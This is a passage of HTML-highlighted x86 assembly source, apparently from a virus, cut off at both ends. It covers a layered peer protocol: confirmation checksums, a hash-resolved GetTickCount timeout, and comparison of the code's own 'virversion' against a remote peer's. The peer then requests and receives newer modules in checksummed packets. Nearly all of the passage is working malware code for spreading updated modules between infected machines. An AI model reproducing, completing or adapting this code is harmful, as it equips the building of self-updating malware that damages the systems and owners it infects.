</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">channelsend</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">checkconfirmation12</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">chochoconf12</span><span class="sc0">

</span><span class="sc5">checkconfirmation8</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">chochoconf12</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">cecuser</span><span class="sc4">,</span><span class="sc5">ly334</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">getcrcvalthat1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getcrcvalthat1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'AB'</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'CD'</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notnothing</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">notnothing</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">checkoneA</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">17357e7Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; GetTickCount</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0">             </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">11b</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">             </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">11b</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">             </span><span class="sc5">dothat</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ActualSet</span><span class="sc4">,</span><span class="sc5">ly3415</span><span class="sc0">        </span><span class="sc1">; load actual set</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">dothat</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; reset it</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">            </span><span class="sc5">layer3init</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">dothat</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">             </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; this is layer4 init</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       direct input:      Call back function each time </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               0:      connection termination</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Serv          1:      Intercommunication Ok, I'm server!</span><span class="sc0">
</span><span class="sc1">; Client    2:  Client initialisation ok, process to data</span><span class="sc0">
</span><span class="sc1">; Serv          3:      Data directory ( 4 byte of directory )</span><span class="sc0">
</span><span class="sc1">; Client        4:      Download X, if none interresting apply 1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   then 1 switch Client to server, if the server have already processed</span><span class="sc0">
</span><span class="sc1">;   a one, then </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">pingcounter</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">uploadinput</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">onepassonly</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">layer4init</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'1'</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">minisend</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setpingcnt</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; nullfify upload input</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">layer4uninit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setpingcnt</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; nullfify upload input</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; nullfify upload input</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">layer3to4uninit</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkoneA</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;layer4to5uninit:               ; layer 5 is independent of</span><span class="sc0">
</span><span class="sc1">;                       ; layer 4 as it's a </span><span class="sc0">
</span><span class="sc1">;                       ; continuation, then it's void!</span><span class="sc0">
</span><span class="sc1">;ret</span><span class="sc0">

</span><span class="sc5">minisend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                 </span><span class="sc1">; cl = ascii code</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; send unique letter/number</span><span class="sc0">
                        </span><span class="sc1">; to the input</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">directinput</span><span class="sc0">             </span><span class="sc1">; send the char</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">layer4input</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setpingcnt</span><span class="sc0">              </span><span class="sc1">; set the ping counting</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">otherthing0</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">layer4uninit</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">otherthing0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'1'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">otherthing</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'2'</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">minisend</span><span class="sc0">                </span><span class="sc1">; is 1 detected ?</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">otherthing</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'2'</span><span class="sc0">          </span><span class="sc1">; confirmation received ?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">otherthing2</span><span class="sc0">

</span><span class="sc5">CSyscall</span><span class="sc0"> </span><span class="sc5">getvirversion</span><span class="sc0">              </span><span class="sc1">; send the version</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0000'</span><span class="sc0">              </span><span class="sc1">; send version</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'3'</span><span class="sc0">          </span><span class="sc1">; set data directory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">directinput</span><span class="sc0">             </span><span class="sc1">; then </span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">otherthing2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'3'</span><span class="sc0">          </span><span class="sc1">; module directory received ?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">otherthing3</span><span class="sc0">

</span><span class="sc5">CSyscall</span><span class="sc0"> </span><span class="sc5">getvirversion</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc12">'0000'</span><span class="sc0">              </span><span class="sc1">; load the version directory</span><span class="sc0">
                        </span><span class="sc1">; normally</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">   
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">getit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">skipgettingithigh</span><span class="sc0">           </span><span class="sc1">; if new version &lt;= our</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; no, then we have what</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; we are seeking for</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">uploadinput</span><span class="sc4">,</span><span class="sc5">ui1</span><span class="sc0">         
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; set the upload input</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">                  </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; load mem from stack</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'4'</span><span class="sc0">          </span><span class="sc1">; ask for module with ID 4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">directinput</span><span class="sc0">             </span><span class="sc1">; set it!</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finishloop</span><span class="sc0">

</span><span class="sc5">skipgettingithigh</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; load next our version</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; load next remote version</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getit</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">uploadinput</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sgth131</span><span class="sc0">    </span><span class="sc1">; set the upload input</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">processallokay</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">                  </span><span class="sc1">; send close commumincation</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">minisend</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">layer4uninit</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">processallokay</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'1'</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">minisend</span><span class="sc0">

</span><span class="sc5">finishloop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">otherthing3</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'4'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">otherthing4</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">uploadinput</span><span class="sc4">,</span><span class="sc5">ot3</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">layer5init</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">otherthing4</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">layer5</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">setpingcnt</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pingcounter</span><span class="sc4">,</span><span class="sc5">ly4i</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">17357E7Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; GetTickCount</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">layer4pingdetect</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">17357E7Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; GetTickCount</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pingcounter</span><span class="sc4">,</span><span class="sc5">ly4i210</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skipthisoneone</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">25000</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">skipthisoneone</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">layer4uninit</span><span class="sc0">

</span><span class="sc5">skipthisoneone</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; layer 5, packet exchanging</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Server        5:      Packet - Checksum - Size (100 byte sec) - Datas</span><span class="sc0">
</span><span class="sc1">; Client        6:      - Acknowledge - Packet</span><span class="sc0">
</span><span class="sc1">; Client    7:  - Negative Acknowledge, resend</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Serveur       8:      Packet end - Crc of the module</span><span class="sc0">
</span><span class="sc1">; Client    9:  uninit layer 5</span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">; Server:   uninit layer5 , then reply 1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">destbuffer</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">layer5init</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; send packet ?</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendpacket</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">layer5</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'5'</span><span class="sc0">          </span><span class="sc1">; compare if we received </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">returnlayer5</span><span class="sc0">                </span><span class="sc1">; packet start message</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">destbuffer</span><span class="sc4">,</span><span class="sc5">k1</span><span class="sc0">

